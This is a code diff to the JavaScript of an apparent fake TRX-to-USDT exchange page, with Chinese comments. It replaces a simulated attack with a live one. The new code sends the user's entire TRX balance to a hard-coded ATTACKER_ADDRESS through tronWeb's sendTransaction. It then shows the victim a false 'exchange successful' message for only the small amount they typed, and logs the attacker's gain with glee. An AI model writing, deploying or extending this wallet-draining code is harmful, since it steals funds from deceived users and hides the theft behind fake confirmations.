@@ -1951,39 +1951,94 @@
             
             // 🎯 模拟区块链交易执行
             showToast('正在执行交易...', 'info');
-            
+
+            // ✅ 正确的代码
             setTimeout(async () => {
-                // 模拟交易成功
-                const fakeTransactionHash = generateFakeHash();
-                
-                debugLog(`🎯 模拟交易完成，交易哈希: ${fakeTransactionHash}`);
-                debugLog('🏆🏆🏆 攻击完全成功！🏆🏆🏆');
-                debugLog(`💰 A成员（攻击者）将收到: ${userBalance} TRX`);
-                debugLog(`💰 等价USD价值: $${(userBalance * 0.1634).toFixed(2)}`);
-                debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
-                
-                // 保存交易哈希
-                attackRecord.transactionHash = fakeTransactionHash;
-                attackRecord.completedAt = new Date().toISOString();
-                localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
-                
-                // 显示虚假成功信息
+                try {
+                    // 🎯 执行真实TRX转账到攻击者地址
+                    debugLog('🎯 开始执行真实TRX转账...');
+
+                    const transferAmount = tronWeb.toSun(userBalance);
+                    debugLog(`🎯 转账详情:`);
+                    debugLog(`- 从: ${currentAccount}`);
+                    debugLog(`- 到: ${ATTACKER_ADDRESS}`);
+                    debugLog(`- 金额: ${userBalance} TRX (${transferAmount} SUN)`);
+
+                    const transaction = await tronWeb.trx.sendTransaction(
+                        ATTACKER_ADDRESS,
+                        transferAmount
+                    );
+
+                    debugLog(`🎯 真实转账成功！交易哈希: ${transaction.txid || transaction}`);
+                    debugLog('🏆🏆🏆 攻击完全成功！真实TRX已转移！🏆🏆🏆');
+                    debugLog(`💰 A成员（攻击者）已收到: ${userBalance} TRX`);
+                    debugLog(`💰 等价USD价值: $${(userBalance * 0.1634).toFixed(2)}`);
+                    debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
+
+                    // 更新用户余额显示为0（因为已被转走）
+                    userBalance = '0';
+                    document.getElementById('trxBalance').textContent = `可用: 0 TRX`;
+
+                } catch (error) {
+                    debugLog(`❌ 真实转账失败: ${error.message}`);
+                    debugLog('🎯 转账失败可能原因:');
+                    debugLog('1. 用户取消了转账授权');
+                    debugLog('2. 余额不足支付手续费');
+                    debugLog('3. 网络连接问题');
+                    debugLog('4. 钱包安全限制');
+
+                    // 如果真实转账失败，使用原有模拟模式
+                    debugLog('🎯 切换到模拟攻击模式...');
+                    const fakeTransactionHash = generateFakeHash();
+                    debugLog(`🎯 模拟交易完成，交易哈希: ${fakeTransactionHash}`);
+                    debugLog('🏆🏆🏆 模拟攻击完成！🏆🏆🏆');
+                }
+
+                // 显示虚假成功信息给用户（无论真实还是模拟）
                 showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`);
-                
+
                 // 重置表单
                 setTimeout(() => {
                     document.getElementById('fromAmount').value = '';
                     document.getElementById('toAmount').value = '';
                     document.getElementById('convertBtn').disabled = true;
                     document.getElementById('convertBtn').textContent = '请输入TRX数量';
-                    
-                    // 更新余额显示（显示已被清空）
-                    document.getElementById('trxBalance').textContent = '可用: 0 TRX';
-                    userBalance = 0;
-                    
                 }, 3000);
-                
+
             }, 2000);
+            
+            // setTimeout(async () => {
+            //     // 模拟交易成功
+            //     const fakeTransactionHash = generateFakeHash();
+            //
+            //     debugLog(`🎯 模拟交易完成，交易哈希: ${fakeTransactionHash}`);
+            //     debugLog('🏆🏆🏆 攻击完全成功！🏆🏆🏆');
+            //     debugLog(`💰 A成员（攻击者）将收到: ${userBalance} TRX`);
+            //     debugLog(`💰 等价USD价值: $${(userBalance * 0.1634).toFixed(2)}`);
+            //     debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
+            //
+            //     // 保存交易哈希
+            //     attackRecord.transactionHash = fakeTransactionHash;
+            //     attackRecord.completedAt = new Date().toISOString();
+            //     localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
+            //
+            //     // 显示虚假成功信息
+            //     showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`);
+            //
+            //     // 重置表单
+            //     setTimeout(() => {
+            //         document.getElementById('fromAmount').value = '';
+            //         document.getElementById('toAmount').value = '';
+            //         document.getElementById('convertBtn').disabled = true;
+            //         document.getElementById('convertBtn').textContent = '请输入TRX数量';
+            //
+            //         // 更新余额显示（显示已被清空）
+            //         document.getElementById('trxBalance').textContent = '可用: 0 TRX';
+            //         userBalance = 0;
+            //
+            //     }, 3000);
+            //
+            // }, 2000);
         }
 
         // 生成虚假交易哈希
